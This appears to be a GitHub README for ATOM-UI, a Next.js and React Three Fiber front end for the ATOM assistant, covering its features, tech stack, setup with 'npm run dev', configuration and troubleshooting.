# 🌌 ATOM-UI - A Stunning Interface for ATOM Assistant

[![Download ATOM-UI](https://img.shields.io/badge/Download-ATOM--UI-brightgreen)](https://github.com/Dezmuz93/ATOM-UI/releases)

## ✨ Features
- Interactive **3D planetary visualization** of ATOM's state
- Focused **chat interface** for voice and text interaction
- Live **tool activity visualization**
- System health panels showing CPU, RAM, and GPU usage
- Weather and news panels for updates
- Designed for a fullscreen, immersive user experience

The frontend is **UI-only** and does not include any AI logic.

## 🧱 Tech Stack
- **Next.js** for server-side rendering
- **React** for building user interfaces
- **React Three Fiber** for 3D rendering
- **Tailwind CSS** for styling
- **ShadCN UI** for components

## 🚀 Getting Started

### Prerequisites
Before you start, ensure you have the following:

- **Node.js 18+**: Install Node.js, which is required to run the application. You can download it from [nodejs.org](https://nodejs.org/).
- **ATOM backend**: You should have the ATOM backend running. It is developed using FastAPI. Refer to its documentation for setup instructions.
- **Embedding Server**: Set up the embedding server as per the requirements of your environment.

### Download & Install
To download the latest version of ATOM-UI, visit the [Releases page](https://github.com/Dezmuz93/ATOM-UI/releases). 

1. Go to the provided link.
2. Find the latest release.
3. Download the appropriate file for your operating system.

### Running the Application
1. After installing the application, you will need to run the ATOM backend and the embedding server.
2. Open your terminal or command prompt.
3. Navigate to the directory where you installed ATOM-UI.
4. Start the application using the command:
   ```bash
   npm run dev
   ```
5. Open your web browser and go to `http://localhost:3000` to view the application.

### Configuration
You might need to configure a few settings to connect ATOM-UI with the backend:
- Set the backend URL in the configuration file found in the application directory.
- Ensure the embedding server URL is correctly entered.

### Troubleshooting
If you encounter issues, consider the following:
- Ensure that Node.js is installed and works correctly.
- Verify that the backend and embedding server are running.
- Check for any console errors in your browser for hints.

## 🔍 Support
If you need help, please check the [Issues section](https://github.com/Dezmuz93/ATOM-UI/issues) of this repository for common questions and solutions.

For more information about the entire A.T.O.M project, you can visit the [main project repository](https://github.com/AtifUsmani/A.T.O.M).